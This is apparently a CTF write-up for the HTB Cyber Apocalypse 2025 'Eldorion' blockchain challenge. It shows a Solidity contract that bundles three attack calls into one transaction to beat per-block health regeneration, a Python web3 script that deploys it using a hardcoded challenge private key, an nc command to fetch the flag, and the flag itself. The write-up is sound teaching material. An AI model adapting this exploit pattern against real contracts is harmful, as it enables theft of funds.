---
title: CTF Writeup ~ Blockchain Eldorian // HTBCyberApocalypse2025
date: 2025-03-27
description: The main vulnerability lies in the health regeneration mechanism. While health resets each block, we can execute multiple attacks within a single transaction (same block) to bypass this regeneration.
image: images/htb/blockchain_eldorion_writeup_hero.png
imageAltAttribute: Blockchain Eldorian writeup
useCustomOgImage: false  # This will use the default site OG image instead of the post image
tags:
- ctf
- HTBCyberApocalypse2025
- writeups
- blockchain
---


# CHALLENGE NAME: Eldorion

## Description:
Welcome to the realms of Eldoria, adventurer. You've found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you. But your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face Eldorion, a colossal beast with terrifying regenerative powers. This creature, known for its "eternal resilience" guards the only passage forward. It's clear: you must defeat Eldorion to continue your quest.

**Points:** 950  
**Difficulty:** Very Easy
**Category:** Blockchain

---

## Solution Walkthrough

### Understanding the Challenge
The challenge involves defeating Eldorion, a smart contract with regenerative health properties. The key aspects are:
1. Eldorion has 300 health points
2. Health regenerates at the start of each block
3. We need to deal enough damage to defeat it before regeneration

### The Vulnerability
The main vulnerability lies in the health regeneration mechanism. While health resets each block, we can execute multiple attacks within a single transaction (same block) to bypass this regeneration.

### Exploitation Steps

1. **Create Attack Contract**: We create a smart contract that bundles multiple attack calls into a single transaction:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
}

contract Attack {
    function exploit(address eldorionAddress) external {
        IEldorion eldorion = IEldorion(eldorionAddress);
        eldorion.attack(100); // First attack
        eldorion.attack(100); // Second attack
        eldorion.attack(100); // Third attack
    }
}
```

2. **Deploy and Execute**: Create a Python script to deploy the attack contract and execute the exploit:

```python
from web3 import Web3
from eth_account import Account
from solcx import compile_source, install_solc

# Install and set solc version
install_solc('0.8.28')

# Connect to the RPC endpoint
w3 = Web3(Web3.HTTPProvider('http://94.237.57.187:45606'))

# Account setup
private_key = '0x927caa97e8b93ef4d1c30551c15a48b700be7b9fec72e41522a1279ee11ee93a'
account = Account.from_key(private_key)
target_address = '0x0B105bAbbaf390bB5eA5b6e9A2eB27019592b142'

print(f"Account address: {account.address}")
print(f"Target contract: {target_address}")

# Update contract source with explicit interface separation
contract_source = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
}

contract Attack {
    function exploit(address eldorionAddress) external {
        IEldorion eldorion = IEldorion(eldorionAddress);
        eldorion.attack(100);
        eldorion.attack(100);
        eldorion.attack(100);
    }
}
'''

# Compile contract
compiled = compile_source(
    contract_source,
    output_values=['abi', 'bin'],
    solc_version='0.8.28',
    base_path='.'
)

# Get contract interface (focusing on Attack contract)
for key, value in compiled.items():
    if ':Attack' in key:  # Find the Attack contract specifically
        contract_interface = value
        break

abi = contract_interface['abi']
bytecode = contract_interface['bin']

print("Contract ABI:", abi)  # Debug print to verify

# Create and deploy contract
contract = w3.eth.contract(abi=abi, bytecode=bytecode)
nonce = w3.eth.get_transaction_count(account.address)

deploy_tx = contract.constructor().build_transaction({
    'from': account.address,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(deploy_tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

contract_address = tx_receipt.contractAddress
print(f"Attack contract deployed at: {contract_address}")

# Create contract instance
attack_contract = w3.eth.contract(address=contract_address, abi=abi)

# Execute exploit
nonce = w3.eth.get_transaction_count(account.address)
exploit_tx = attack_contract.functions.exploit(target_address).build_transaction({
    'from': account.address,
    'nonce': nonce,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(exploit_tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print("Exploit transaction sent:", tx_hash.hex())
print("Transaction status:", "Success" if tx_receipt.status == 1 else "Failed")
```

3. **Get the Flag**: After successfully executing the exploit, connect to the challenge server to retrieve the flag:
```zsh
nc 94.237.57.187 37328
```

## Flag

![Flag](/images/htb/blockchain_eldorion_writeup_flag.png)

```zsh
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```

## Key Takeaways
1. Smart contract state changes within the same transaction occur before block-level effects
2. Bundling multiple attacks in one transaction bypassed the regeneration mechanism
3. Understanding blockchain transaction atomicity is crucial for smart contract security